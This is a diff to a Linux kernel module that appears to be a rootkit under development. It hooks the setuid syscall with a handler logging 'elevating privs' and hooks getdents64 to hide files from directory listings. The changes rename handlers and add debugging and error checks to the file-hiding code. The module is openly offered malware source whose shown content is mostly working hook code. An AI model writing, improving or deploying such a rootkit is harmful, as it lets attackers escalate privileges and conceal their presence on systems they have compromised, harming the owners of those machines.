@@ -7,6 +7,8 @@
 #include <linux/atomic.h>
 #include <linux/dirent.h>
 
+#include <linux/uaccess.h>
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
@@ -23,7 +25,7 @@ atomic_t hooked = ATOMIC_INIT(0);
 
 
 
-void __x64_sys_setuid_pre_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
+void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
 {
     printk(KERN_INFO "setuid hook called, elevating privs...");
 
@@ -47,24 +49,35 @@ void __x64_sys_setuid_pre_handler(struct kprobe *kp, struct pt_regs *regs, unsig
 }
 /* Hiding our files from ls */
 
-static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
+static int __x64_sys_getdents64_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+
 
 	struct linux_dirent64 *current_dir,*kbuf = NULL;
 	unsigned long offset = 0;
 
 	int ret = regs_return_value(regs);
+	printk(KERN_INFO "getdents returned %d bytes", ret);
 	kbuf = kzalloc(ret, GFP_KERNEL);
-
+	if(!kbuf){
+		printk(KERN_ERR "memalloc failed");
+		}
+	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);
 
 	if( (ret<=0) || (kbuf == NULL) )
 		return ret;
 
-	int error = copy_from_user(kbuf,dirent,ret);
+
+	if(!access_ok(dirent,ret)){
+		printk(KERN_ERR "access not ok");
+	}
+
+	long error = copy_from_user(kbuf,dirent,ret);
 	if(error){
-        goto done;
-		printk(KERN_ERR "could not copy from user");
+		printk(KERN_ERR "could not copy %ld bytes from user",ret);
+		printk(KERN_ERR "copy_from_user error: %ld",error);
+		goto done;
 	}
 
 
@@ -94,7 +107,7 @@ done:
     return 0;
 }
 static struct kretprobe  __x64_sys_getdents64_hook= {
-	.handler = __x64_sys_getdents64_post_handler,
+	.handler = __x64_sys_getdents64_handler,
 	.kp.symbol_name="__x64_sys_getdents64",
 	.maxactive=20,
 };
@@ -102,7 +115,7 @@ static struct kretprobe  __x64_sys_getdents64_hook= {
 
 struct kprobe __x64_sys_setuid_hook = {
         .symbol_name = "__x64_sys_setuid",
-        .post_handler = __x64_sys_setuid_pre_handler,
+        .post_handler = __x64_sys_setuid_post_handler,
 };
 
 static int __init rkin(void)
